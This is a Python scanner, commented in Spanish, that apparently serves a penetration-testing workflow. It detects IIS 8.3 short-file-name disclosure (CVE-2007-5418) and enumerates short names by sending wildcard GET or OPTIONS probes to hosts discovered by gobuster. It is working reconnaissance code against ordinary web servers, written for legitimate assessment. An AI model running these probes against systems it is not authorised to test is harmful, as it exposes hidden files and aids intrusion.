#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IIS Short File Name Disclosure scan (8.3 / ~1 tilde enumeration)
================================================================

Detecta y enumera la divulgacion de nombres cortos 8.3 de IIS
(CVE-2007-5418, "IIS tilde/shortfilename enumeration") sobre las URLs base
identificadas como Microsoft-IIS en los outputs de gobuster del repositorio.

Tecnica (scanner de referencia: lijiejie/IIS_shortname_Scanner + adaptacion IIS 8/10):
  1. Deteccion is_vulnerable por directorio:
       GET  <dir>/*~1*/a.aspx          -> si hay shortnames 8.3: 404
       GET  <dir>/l1j1e*~1*/a.aspx     -> prefijo inexistente: != 404
     AUTO (por defecto): si GET no diferencia (IIS request filtering devuelve
       400/401/403, o el sitio responde soft-404), se prueba OPTIONS, que en
       IIS 8/10 permite el comodin '*' y diferencia 404/"resto". El metodo
       que diferencia queda fijado para la enumeracion (--method para forzar).
  2. Sonda de confirmacion (si no se usa --no-confirm):
       <dir>/a*~1.*/1.aspx  vs  <dir>/zz*~1.*/1.aspx  (con el metodo elegido)
       Si no hay diferencia, la enumeracion no sera util -> se marca
       INCONCLUSO (posible falso positivo) y se omite el BFS.
  3. Enumeracion BFS (con el metodo elegido):
       <dir><prefijo>*~1<ext>/1.aspx
       status 404 => existe un nombre corto 8.3 cuyo prefijo es <prefijo>.
       Se expande caracter a caracter (max 6) y luego la extension.
       Corte de seguridad por directorio: --max-reqs (default 1000).

Descubrimiento automatico de URLs IIS:
  * CLIENTE/<IP>_*/outputs/gobuster_evidence.txt
      lineas  VERSIONS<TAB>URL<TAB>Server: Microsoft-IIS/...  => sitio base
  * CLIENTE/<IP>_*/outputs/gobuster_<port>.txt  (mismo puerto del sitio)
      paths  "(Status: 301|302|307|308|<403>)"  => directorios a escanear
  * targets sin evidencia IIS (Apache/Express/nginx/...) se omiten y se
    reportan en el resumen.

Salidas por target en CLIENTE/<IP>_*/outputs/ (junto a los outputs de gobuster):
  iis_shortname_evidence.txt           IIS_SHORTNAME<TAB>URL<TAB>DETALLE
  iis_shortname_evidence.json          idem en JSON (formato estandar del repo)
  iis_shortname_commands_outputs.txt   evidencia humana de cada request
  iis_scan_urls.txt                    directorios escaneados
Resumen global: CLIENTE/iis_shortname_checks/iis_shortname_summary.txt (default).

Uso:
  scripts/iis_shortname_scan.py                       # todos los targets con IIS
  scripts/iis_shortname_scan.py --target 10.155.10.15
  scripts/iis_shortname_scan.py --target 10.156.244.42 --port 81
  scripts/iis_shortname_scan.py --urls mis_urls.txt
  scripts/iis_shortname_scan.py --isvuln              # solo deteccion
  scripts/iis_shortname_scan.py --dry-run             # lista URLs sin trafico
"""

import argparse
import glob
import json
import os
import queue
import re
import ssl
import sys
import threading
import time
import urllib.parse
from datetime import datetime

if sys.version_info >= (3, 0):
    import http.client as httplib
else:  # pragma: no cover
    import httplib

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
ALPHANUM = "abcdefghijklmnopqrstuvwxyz0123456789_-"
LOW_ALPHANUM = "abcdefghijklmnopqrstuvwxyz0123456789"
CHECK = "IIS_SHORTNAME"
DIR_STATUS = frozenset((301, 302, 307, 308, 403))


def esc_json(s):
    """Escapa un string para insertarlo en una linea JSON (patron repo)."""
    return json.dumps(s, ensure_ascii=True)


class ResultCollection(object):
    """Acumula hallazgos y evidencia de requests por target (thread-safe)."""

    def __init__(self):
        self.lock = threading.Lock()
        self.findings = []   # dicts {title, description, url, check, port, source}
        self.reqs = []       # lineas de evidencia humana

    def add_finding(self, url, msg, port):
        with self.lock:
            self.findings.append({
                "title": "IIS Short File Name Disclosure (8.3)",
                "description": msg,
                "url": url,
                "check": CHECK,
                "port": port if port else None,
                "source": "iis_shortname_scan",
            })
            self.reqs.append("FINDING| %s | %s" % (url, msg))

    def add_req(self, line):
        with self.lock:
            self.reqs.append(line)


class ShortNameScanner(object):
    """Escaneo de IIS 8.3 short name disclosure sobre UN directorio."""

    def __init__(self, url, results, timeout=8, threads=20, max_reqs=1000,
                 method="AUTO", verbose=False):
        self.url = url.rstrip("/") + "/"            # base con trailing slash
        p = urllib.parse.urlparse(self.url)
        self.scheme = p.scheme or "http"
        self.host = p.hostname
        self.port = p.port or (443 if self.scheme == "https" else 80)
        self.path = p.path or "/"
        if not self.path.endswith("/"):
            self.path += "/"
        self.base = self.path.rstrip("/")           # "/Content" o "" para raiz
        self.start = self.base + "/"                # "/Content/" o "/" (raiz)
        self.results = results
        self.timeout = timeout
        self.threads = max(1, threads)
        self.verbose = verbose
        self.max_reqs = max_reqs
        self.method_override = method.upper() if method else "AUTO"
        self.enum_method = ""       # GET/OPTIONS elegido para enumerar
        self.confirm_ok = False     # sonda de confirmacion de enumeracion
        self.req_count = 0
        self.req_lock = threading.Lock()
        self.cut_reached = False
        self.responses_ok = 0   # sondas que devolvieron un status HTTP real
        self.files = []       # shortnames que parecen archivos
        self.dirs = []        # shortnames que parecen directorios
        self.vuln_methods = []  # metodos (GET/OPTIONS) con los que difiere

    # ------------------------------------------------------------------ conexion
    def _conn(self):
        if self.scheme == "https":
            ctx = ssl._create_unverified_context()
            return httplib.HTTPSConnection(self.host, self.port,
                                           timeout=self.timeout, context=ctx)
        return httplib.HTTPConnection(self.host, self.port, timeout=self.timeout)

    def _status(self, method, abs_path):
        try:
            conn = self._conn()
            try:
                conn.request(method, abs_path, headers={"User-Agent": UA})
                resp = conn.getresponse()
                st = resp.status
                with self.req_lock:
                    self.responses_ok += 1
                return st
            finally:
                conn.close()
        except Exception:
            return None

    def request_line(self, method, abs_path):
        return "%s %s HTTP/1.1  (Host: %s)" % (method, abs_path, self.host)

    # ------------------------------------------------------------------ deteccion
    def _probe_pair(self, method):
        """(s_exist, s_noexist) para la sonda clasica de deteccion."""
        p_exist = self.base + "/*~1*/a.aspx"
        p_noex = self.base + "/l1j1e*~1*/a.aspx"
        s1 = self._status(method, p_exist)
        s2 = self._status(method, p_noex)
        self.results.add_req("%s -> %s" % (self.request_line(method, p_exist), s1))
        self.results.add_req("%s -> %s" % (self.request_line(method, p_noex), s2))
        return s1, s2

    def is_vulnerable(self):
        """Deteccion de 8.3. AUTO: GET primero; si no diferencia, OPTIONS.

        OPTIONS evita el request filtering de IIS (el '*' en GET suele
        devolver 400) y el soft-404 (GET devuelve 404 a todo). El primer
        metodo que diferencia se guarda como self.enum_method.
        """
        force = self.method_override
        if force in ("GET", "OPTIONS"):
            s1, s2 = self._probe_pair(force)
            if s1 == 404 and s2 != 404:
                self.vuln_methods.append(force)
                self.enum_method = force
                return True
            return False

        # AUTO: intentar GET
        s1, s2 = self._probe_pair("GET")
        if s1 == 404 and s2 != 404:
            self.vuln_methods.append("GET")
            self.enum_method = "GET"
            self.results.add_req("ENUM_METHOD| GET (la sonda GET diferencia)")
            return True

        # GET sin exito (400/401/403 por request filtering o soft-404):
        # probar OPTIONS, que en IIS 8/10 es la que permite el comodin.
        s1o, s2o = self._probe_pair("OPTIONS")
        if s1o == 404 and s2o != 404:
            self.vuln_methods.append("OPTIONS")
            self.enum_method = "OPTIONS"
            reson = "GET sin diferencias (s1=%s s2=%s)" % (s1, s2)
            self.results.add_req("ENUM_METHOD| OPTIONS (%s; s1=%s s2=%s)" %
                                 ("OPTIONS diferencia", s1o, s2o))
            self.results.add_req("METHOD_FALLBACK| GET no usable: %s" % reson)
            return True
        return False

    def confirm_enumerable(self):
        """Sonda real de enumeracion: <dir>/a*~1.*/1.aspx vs <dir>/zz*~1.*/1.aspx.

        Usa el metodo elegido (GET u OPTIONS). Si ambos devuelven lo mismo,
        la enumeracion no daria resultados utiles (falso positivo o nombre
        con caracteres fuera del set) -> no lanzar BFS.
        """
        m = self.enum_method or "GET"
        p_hit = self.base + "/a*~1.*/1.aspx"
        p_miss = self.base + "/zz*~1.*/1.aspx"
        s_hit = self._status(m, p_hit)
        s_miss = self._status(m, p_miss)
        self.results.add_req("%s -> %s" % (self.request_line(m, p_hit), s_hit))
        self.results.add_req("%s -> %s" % (self.request_line(m, p_miss), s_miss))
        self.confirm_ok = (s_hit == 404 and s_miss != 404)
        return self.confirm_ok

    # ------------------------------------------------------------------ enumeracion
    def _scan_worker(self, q, stop):
        m = self.enum_method or "GET"
        while not stop.is_set():
            try:
                url, ext = q.get(timeout=0.5)
            except queue.Empty:
                return
            with self.req_lock:
                self.req_count += 1
                if self.req_count > self.max_reqs:
                    self.cut_reached = True
                    stop.set()
                    return
            status = self._status(m, url + "*~1" + ext + "/1.aspx")
            self.results.add_req("%s -> %s" % (
                self.request_line(m, url + "*~1" + ext + "/1.aspx"), status))
            if status == 404:
                # 404 => existe un nombre corto 8.3 con este prefijo
                if len(url) - len(self.start) < 6:      # solo primeros 6 chars
                    for c in ALPHANUM:
                        q.put((url + c, ext))
                else:
                    if ext == ".*":
                        q.put((url, ""))                # probar como directorio
                    elif ext == "":
                        self.dirs.append(url + "~1")
                    elif len(ext) == 5 or not ext.endswith("*"):
                        self.files.append(url + "~1" + ext)
                    else:
                        for c in LOW_ALPHANUM:
                            q.put((url, ext[:-1] + c + "*"))
                            if len(ext) < 4:
                                q.put((url, ext[:-1] + c))

    def run_enum(self):
        q = queue.Queue()
        for c in ALPHANUM:
            q.put((self.start + c, ".*"))

        stop = threading.Event()
        workers = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._scan_worker, args=(q, stop))
            t.daemon = True
            t.start()
            workers.append(t)

        for w in workers:
            w.join()
        stop.set()


# ======================================================================
# Descubrimiento de URLs IIS desde los outputs del repo
# ======================================================================
def discover_iis_sites(proyecto):
    """Devuelve (sites, tgt_dirs).

    sites:    {ip: {port: {"url": base, "dirs": [path,...]}}}
    tgt_dirs: {ip: <directorio del target CLIENTE/<IP>_*_>}
    Lee CLIENTE/<IP>_*/outputs/gobuster_evidence.txt y filtra las lineas
    VERSIONS con 'Server: Microsoft-IIS'. Para cada puerto con IIS agrega
    los directorios (Status 301/302/307/308/403) del gobuster_<port>.txt.
    """
    sites = {}
    tgt_dirs = {}
    ev_files = sorted(glob.glob(os.path.join(proyecto, "*", "outputs",
                                             "gobuster_evidence.txt")))
    for ev in ev_files:
        tgt_dir = os.path.dirname(os.path.dirname(ev))
        ip = os.path.basename(tgt_dir).split("_")[0]
        port_urls = {}
        with open(ev, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                parts = line.rstrip("\n").split("\t")
                if len(parts) < 3:
                    continue
                check, url, det = parts[0], parts[1], parts[2]
                if check != "VERSIONS" or "Microsoft-IIS" not in det:
                    continue
                p = urllib.parse.urlparse(url)
                port = p.port or (443 if p.scheme == "https" else 80)
                base = "%s://%s:%s" % (p.scheme, p.hostname, port)
                port_urls.setdefault(port, {"url": base, "dirs": []})
        if not port_urls:
            continue
        tgt_dirs[ip] = tgt_dir
        # directorios descubiertos por gobuster para cada puerto IIS
        for g in sorted(glob.glob(os.path.join(tgt_dir, "outputs",
                                               "gobuster_*.txt"))):
            m = re.search(r"gobuster_(\d+)\.txt$", os.path.basename(g))
            if not m:
                continue
            port = int(m.group(1))
            if port not in port_urls:
                continue
            with open(g, encoding="utf-8", errors="replace") as fh:
                for line in fh:
                    dm = re.match(r"^(\S+)\s+\(Status: (\d+)\)", line)
                    if dm and int(dm.group(2)) in DIR_STATUS:
                        path = dm.group(1).strip("/")
                        if path:
                            port_urls[port]["dirs"].append(path)
        sites[ip] = port_urls
    return sites, tgt_dirs


def build_urls(sites, target=None, port=None, only_root=False):
    """Devuelve {ip: [urls de directorios a escanear]} ordenado y unico."""
    out = {}
    for ip in sorted(sites):
        if target and ip != target:
            continue
        url_list = []
        for p in sorted(sites[ip]):
            if port and p != port:
                continue
            base = sites[ip][p]["url"]
            url_list.append(base + "/")
            if not only_root:
                for d in sorted(set(sites[ip][p]["dirs"])):
                    url_list.append(base + "/" + d + "/")
        if url_list:
            out[ip] = sorted(set(url_list))
    return out


def read_urls_file(path):
    """Lee una lista plana de URLs (una por linea, '#' para comentarios)."""
    urls = []
    with open(path, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(line)
    return urls


def group_urls_by_host(urls):
    """Devuelve {hostname: [urls]} agrupando por host de la URL."""
    out = {}
    for u in urls:
        host = urllib.parse.urlparse(u).hostname
        if host:
            out.setdefault(host, []).append(u)
    return {k: sorted(set(v)) for k, v in out.items()}


# ======================================================================
# Salidas de evidencia (formato estandar del repo)
# ======================================================================
def count_findings(path):
    """Numero de hallazgos IIS_SHORTNAME en un evidence.txt existente."""
    n = 0
    if os.path.exists(path):
        with open(path, encoding="utf-8") as fh:
            for line in fh:
                if line.startswith("IIS_SHORTNAME\t"):
                    n += 1
    return n


def write_target_outputs(ip, out_dir, results, urls_scan, estados=None,
                         force=False):
    """Escribe los resultados del target en out_dir.

    Si TODOS los estados de la corrida son SIN_CONEXION y ya existe evidencia
    previa no vacia, NO sobrescribe (salvo force=True) para no pisar una
    corrida anterior con datos validos. Devuelve (ev_txt, nfind, overwritten).
    """
    d = out_dir
    os.makedirs(d, exist_ok=True)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ev_txt = os.path.join(d, "iis_shortname_evidence.txt")
    prev_findings = count_findings(ev_txt)

    # Proteccion: corrida sin conexion completa sobre evidencia previa con datos
    if estados and not force:
        all_no_conn = bool(estados) and all(e == "SIN_CONEXION"
                                            for e in estados.values())
        if all_no_conn and prev_findings > 0:
            note = os.path.join(
                d, "iis_shortname_skipped_corridas.txt")
            with open(note, "a", encoding="utf-8") as fh:
                fh.write("%s | corrida SIN CONEXION total (%d urls) - NO se "
                         "sobrescribio la evidencia previa del %s\n"
                         % (now, len(urls_scan), ip))
            return ev_txt, prev_findings, False

    with open(ev_txt, "w", encoding="utf-8") as fh:
        fh.write("# Escaneo IIS Short File Name Disclosure - %s (%s)\n" % (ip, now))
        for f in results.findings:
            fh.write("%s\t%s\t%s\n" % (f["check"], f["url"], f["description"]))

    ev_json = os.path.join(d, "iis_shortname_evidence.json")
    with open(ev_json, "w", encoding="utf-8") as fh:
        if results.findings:
            fh.write("[\n")
            for i, f in enumerate(results.findings):
                if i:
                    fh.write(",\n")
                fh.write("{\"title\":%s,\"description\":%s,\"url\":%s,"
                         "\"check\":%s,\"port\":%s,\"source\":\"iis_shortname_scan\"}" % (
                             esc_json(f["title"]), esc_json(f["description"]),
                             esc_json(f["url"]), esc_json(f["check"]),
                             json.dumps(f.get("port") or None)))
            fh.write("\n]\n")
        else:
            fh.write("[]\n")

    cmd = os.path.join(d, "iis_shortname_commands_outputs.txt")
    with open(cmd, "w", encoding="utf-8") as fh:
        fh.write("# iis_shortname_commands_outputs - %s (%s)\n" % (ip, now))
        fh.write("# Evidencia humana de cada request; NO lo consume el Agente 6.\n")
        for line in results.reqs:
            fh.write(line + "\n")

    uf = os.path.join(d, "iis_scan_urls.txt")
    with open(uf, "w", encoding="utf-8") as fh:
        for u in urls_scan:
            fh.write(u + "\n")

    return ev_txt, len(results.findings), True


def write_summary(out_dir, rows, total_urls):
    """Log acumulado de corridas.

    rows: (ip, n_urls, n_detect, n_confirm, n_inconcl, n_incompleto,
           n_no_vuln, n_sin_conexion, n_short). Se acumula por corrida para
           conservar historial (no sobrescribe la corrida anterior).
    """
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    path = os.path.join(out_dir, "iis_shortname_summary.txt")
    existed = os.path.exists(path)
    os.makedirs(out_dir, exist_ok=True)
    with open(path, "a", encoding="utf-8") as fh:
        if not existed:
            fh.write("# Resumen IIS Short File Name Disclosure (log acumulado "
                     "por corrida; no se borran corridas previas)\n")
        else:
            fh.write("# (corrida previa conservada)\n")
        fh.write("# ===== corrida %s | total urls: %d =====\n" % (now, total_urls))
        fh.write("# target\turls\tdetect\tconfirm\tinconcl\tincompl\t"
                 "no_vuln\tsin_conn\tshortnames\n")
        for (ip, n_urls, n_detect, n_confirm, n_inconcl, n_incompleto,
             n_no_vuln, n_sin_conexion, n_short) in rows:
            fh.write("%s\t%d\t%d\t%d\t%d\t%d\t%d\t%d\t%d\n" % (
                ip, n_urls, n_detect, n_confirm, n_inconcl, n_incompleto,
                n_no_vuln, n_sin_conexion, n_short))
    return path
# ======================================================================
# main
# ======================================================================
def main():
    WORKSPACE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    ap = argparse.ArgumentParser(
        prog="iis_shortname_scan",
        description="Escaneo de IIS Short File Name Disclosure (8.3 / ~1) "
                    "sobre las URLs Microsoft-IIS de los outputs de gobuster.")
    ap.add_argument("--proyecto", "-p", default=os.path.join(WORKSPACE, "CLIENTE"),
                    help="directorio raiz con CLIENTE/<IP>_*/outputs (default CLIENTE)")
    ap.add_argument("--out", "-o", default=os.path.join(WORKSPACE, "CLIENTE",
                                                        "iis_shortname_checks"),
                    help="directorio para el resumen global y salidas de targets "
                         "sin carpeta en CLIENTE (default CLIENTE/iis_shortname_checks). "
                         "Con proyecto CLIENTE las salidas por target van en "
                         "CLIENTE/<IP>_*/outputs/")
    ap.add_argument("--target", "-t", default="",
                    help="procesar solo ese target IP")
    ap.add_argument("--port", type=int, default=None,
                    help="solo ese puerto del sitio IIS")
    ap.add_argument("--urls", "-u", default="",
                    help="archivo con URLs manuales (una por linea) en vez de "
                         "descubrir desde gobuster")
    ap.add_argument("--only-root", action="store_true",
                    help="escanear solo la raiz del sitio, sin los directorios "
                         "descubiertos por gobuster")
    ap.add_argument("--isvuln", "--no-enum", dest="isvuln", action="store_true",
                    help="solo deteccion de vulnerabilidad, sin enumerar nombres")
    ap.add_argument("--method", default="AUTO",
                    help="metodo HTTP para deteccion/enumeracion: GET, OPTIONS "
                         "o AUTO (default AUTO: GET, con fallback a OPTIONS)")
    ap.add_argument("--no-confirm", action="store_true",
                    help="omitir la sonda de confirmacion a* vs zz* antes de "
                         "enumerar (por defecto se valida y se marca inconcluso si no diferencia)")
    ap.add_argument("--force", action="store_true",
                    help="sobrescribir la evidencia de un target aunque la "
                         "corrida haya sido SIN CONEXION total (por defecto "
                         "se conserva la evidencia previa con datos)")
    ap.add_argument("--threads", "-c", type=int, default=20,
                    help="hilos de enumeracion (default 20)")
    ap.add_argument("--max-reqs", type=int, default=1000,
                    help="max requests de enumeracion por directorio "
                         "(default 1000; corta falsos positivos explosivos)")
    ap.add_argument("--timeout", "-T", type=int, default=8,
                    help="timeout por request, segundos (default 8)")
    ap.add_argument("--delay", "-d", type=float, default=0.2,
                    help="espera entre directorios escaneados (default 0.2)")
    ap.add_argument("--dry-run", action="store_true",
                    help="solo listar URLs a escanear, sin enviar requests")
    ap.add_argument("-v", "--verbose", action="store_true",
                    help="verboso")
    args = ap.parse_args()

    if args.urls:
        urls = read_urls_file(args.urls)
        targets = group_urls_by_host(urls)
        tgt_dirs = {}
    else:
        sites, tgt_dirs = discover_iis_sites(args.proyecto)
        if args.target and args.target not in sites:
            print("[!] %s: sin evidencia Microsoft-IIS en "
                  "outputs/gobuster_evidence.txt (se omite)." % args.target)
        targets = build_urls(sites, target=args.target, port=args.port,
                             only_root=args.only_root)

    if args.dry_run:
        print("# dry-run: %d targets(s) - %d url(s)" %
              (len(targets), sum(len(v) for v in targets.values())))
        for ip in sorted(targets):
            print("# %s" % ip)
            for u in targets[ip]:
                print("  %s" % u)
        return 0

    os.makedirs(args.out, exist_ok=True)
    rows = []
    total_urls = 0
    estados_targets = {}   # ip -> {url: estado}
    for ip in sorted(targets):
        results = ResultCollection()
        n_detect = 0
        n_confirm = 0
        n_inconcl = 0
        n_incompleto = 0
        n_no_vuln = 0
        n_sin_conexion = 0
        n_short = 0
        estados = {}
        for u in targets[ip]:
            port = urllib.parse.urlparse(u).port
            print("[-] %s  (check 8.3...)" % u, flush=True)
            sc = ShortNameScanner(u, results, timeout=args.timeout,
                                  threads=args.threads,
                                  max_reqs=args.max_reqs,
                                  method=args.method,
                                  verbose=args.verbose)
            if sc.is_vulnerable():
                n_detect += 1
                base = "IIS Short File Name Disclosure (8.3/~1)"
                metodo = ", ".join(sc.vuln_methods)
                estado = "DETECCION"
                if not args.isvuln:
                    if (not args.no_confirm) and not sc.confirm_enumerable():
                        estado = "INCONCLUSO"
                        results.add_req(
                            "INCONCLUSO| %s la sonda a* vs zz* no diferencia "
                            "con %s (posible falso positivo o shortname con "
                            "caracteres fuera del set) - validar manualmente" %
                            (u, sc.enum_method))
                    else:
                        sc.run_enum()
                        if sc.cut_reached:
                            estado = "INCOMPLETO"
                            results.add_req(
                                "CUT| %s limite de %d requests de enumeracion "
                                "alcanzado" % (u, sc.max_reqs))
                        for dname in sorted(set(sc.dirs)):
                            n_short += 1
                            results.add_finding(
                                u, "VULNERABLE CONFIRMADO - Posible nombre corto "
                                   "8.3 (directorio): %s" % dname, port)
                        for fname in sorted(set(sc.files)):
                            n_short += 1
                            results.add_finding(
                                u, "VULNERABLE CONFIRMADO - Posible nombre corto "
                                   "8.3 (archivo): %s" % fname, port)
                        if sc.dirs or sc.files:
                            estado = "CONFIRMADO"
                if estado == "CONFIRMADO":
                    n_confirm += 1
                    results.add_finding(
                        u, "VULNERABLE CONFIRMADO - %s difiere por %s; "
                           "shortname(s) enumerado(s)" % (base, metodo), port)
                elif estado == "INCONCLUSO":
                    n_inconcl += 1
                    results.add_finding(
                        u, "DETECCION POSITIVA - ENUMERACION INCONCLUSA "
                           "(%s; sonda a* vs zz* no diferencia) - validar "
                           "manualmente: difiere por %s" % (base, metodo), port)
                elif estado == "INCOMPLETO":
                    n_incompleto += 1
                    results.add_finding(
                        u, "DETECCION POSITIVA - ENUMERACION INCOMPLETA "
                           "(%s; corte por max-reqs): difiere por %s" %
                           (base, metodo), port)
                else:  # DETECCION (modo --isvuln / sin confirmacion)
                    results.add_finding(
                        u, "DETECCION POSITIVA - %s difiere por %s" %
                           (base, metodo), port)
            else:
                if sc.responses_ok == 0:
                    estado = "SIN_CONEXION"
                    n_sin_conexion += 1
                    results.add_req(
                        "NO_CONEXION| %s sin respuesta (VPN caida/host "
                        "apagado) - no concluye" % u)
                else:
                    estado = "NO_VULNERABLE"
                    n_no_vuln += 1
                    results.add_req("NOT_VULNERABLE| %s" % u)
            estados[u] = estado
            if args.delay > 0:
                time.sleep(args.delay)
        estados_targets[ip] = estados
        # salidas por target: CLIENTE/<IP>_*/outputs/ (o fallback args.out/<ip>)
        td = tgt_dirs.get(ip)
        dest = os.path.join(td, "outputs") if td else os.path.join(args.out, ip)
        ev_txt, nfind, overwritten = write_target_outputs(
            ip, dest, results, targets[ip], estados, args.force)
        total_urls += len(targets[ip])
        rows.append((ip, len(targets[ip]), n_detect, n_confirm, n_inconcl,
                     n_incompleto, n_no_vuln, n_sin_conexion, n_short))
        tag = "[OK]" if overwritten else "[SKIP]"
        print("%s %s: %d urls | detect=%d conf=%d inc=%d incompl=%d "
              "no_vuln=%d sin_conn=%d short=%d | hallazgos=%d\n"
              "     -> %s (sobrescrito=%s)" %
              (tag, ip, len(targets[ip]), n_detect, n_confirm, n_inconcl,
               n_incompleto, n_no_vuln, n_sin_conexion, n_short, nfind,
               ev_txt, overwritten))

    summary = write_summary(args.out, rows, total_urls)
    print("OK resumen -> %s" % summary)
    return 0


if __name__ == "__main__":
    sys.exit(main())